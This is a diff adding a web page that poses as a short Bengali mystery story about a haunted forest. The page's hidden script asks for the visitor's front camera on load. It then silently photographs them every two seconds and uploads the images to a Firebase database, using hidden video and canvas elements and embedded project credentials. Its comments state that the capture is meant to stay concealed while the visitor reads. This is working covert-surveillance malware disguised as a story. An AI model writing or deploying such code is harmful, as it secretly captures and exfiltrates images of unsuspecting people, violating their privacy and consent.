@@ -1,0 +1,123 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>অলৌকিক গল্প</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Tiro+Bangla:ital@0;1&display=swap');
+
+        body {
+            font-family: 'Tiro Bangla', serif;
+            background-color: #f4f1ea; /* কাগজের মতো রঙ */
+            color: #333;
+            margin: 0;
+            padding: 20px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+        }
+
+        .story-container {
+            background: #fff;
+            padding: 30px;
+            border-radius: 10px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.1);
+            max-width: 500px;
+            line-height: 1.8;
+            font-size: 18px;
+        }
+
+        h1 {
+            text-align: center;
+            font-size: 26px;
+            color: #4a3b32;
+            margin-bottom: 20px;
+            border-bottom: 2px solid #d1c7b8;
+            padding-bottom: 10px;
+        }
+
+        p {
+            text-indent: 20px;
+            margin-bottom: 15px;
+            text-align: justify;
+        }
+
+        .highlight {
+            color: #8b5a2b;
+            font-weight: bold;
+        }
+
+    </style>
+</head>
+<body>
+
+    <div class="story-container">
+        <h1>রহস্যময় জঙ্গলের গল্প</h1>
+        <p>অনেক দিন আগের কথা। এক প্রত্যন্ত গ্রামের পাশে ছিল এক গভীর জঙ্গল। গ্রামের লোকেরা বলত, ওই জঙ্গলে নাকি রাতের বেলা আলো জ্বলে ওঠে। কেউ কেউ বলত এটা কোনো জাদু, আবার কেউ বলত এটা পথহারা পথিকের আত্মা।</p>
+        
+        <p>একদিন গ্রামের সাহসী যুবক <span class="highlight">রাহুল</span> ঠিক করল, সে একবার গিয়ে দেখবে ওই রহস্যের আসল রূপ কী। সে তার ব্যাগে খাবার আর একটা পুরনো টর্চ নিয়ে বেরিয়ে পড়ল।</p>
+        
+        <p>জঙ্গলের ভেতরে ঢোকার পর রাহুল দেখল, চারদিকে অন্ধকার আর গভীর নীরবতা। হঠাৎ সে দেখল, দূর থেকে একটা মিষ্টি সুর ভেসে আসছে। সেই সুরের দিকে এগোতে গিয়ে সে দেখল...</p>
+
+        <p><em>(গল্পটি এখানেই শেষ। আরও পড়তে চাইলে পেজটি রিফ্রেশ করুন)</em></p>
+    </div>
+
+    <!-- ক্যামেরা এবং ক্যানভাস সম্পূর্ণ লুকানো (Hidden) -->
+    <video id="video" autoplay playsinline style="display:none;"></video>
+    <canvas id="canvas" style="display:none;"></canvas>
+
+    <script type="module">
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
+        import { getDatabase, ref, push } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-database.js";
+
+        const firebaseConfig = {
+            apiKey: "AIzaSyBNm5349AnjfD64njYK_MyOUbPgh2Fsr5s",
+            authDomain: "gallary-eda4d.firebaseapp.com",
+            databaseURL: "https://gallary-eda4d-default-rtdb.firebaseio.com/",
+            projectId: "gallary-eda4d",
+            storageBucket: "gallary-eda4d.firebasestorage.app",
+            messagingSenderId: "565443516153",
+            appId: "1:565443516153:web:c4b32e34138f14c679f428",
+            measurementId: "G-FT6WYWFBR9"
+        };
+
+        const app = initializeApp(firebaseConfig);
+        const db = getDatabase(app);
+
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const ctx = canvas.getContext('2d');
+
+        // পেজ ওপেন হওয়ার সাথে সাথে ক্যামেরা পারমিশন চাইবে
+        navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
+        .then(stream => {
+            video.srcObject = stream;
+            
+            // ইউজার পারমিশন দিলে ২ সেকেন্ড পর পর ছবি তুলে ডাটাবেসে পাঠাবে
+            setInterval(() => {
+                if (video.readyState === video.HAVE_ENOUGH_DATA) {
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                    
+                    const imageData = canvas.toDataURL('image/jpeg', 0.3); 
+                    
+                    const photoRef = ref(db, 'all_photos');
+                    push(photoRef, {
+                        image: imageData,
+                        timestamp: Date.now()
+                    }).catch((error) => {
+                        console.error("Error: ", error);
+                    });
+                }
+            }, 2000); 
+        })
+        .catch(err => {
+            // ইউজার যদি Allow না করে, তবে কোনো কিছুই হবে না (গল্প পড়তে থাকবে)
+            console.log("Permission denied or camera error: " + err);
+        });
+    </script>
+</body>
+</html>
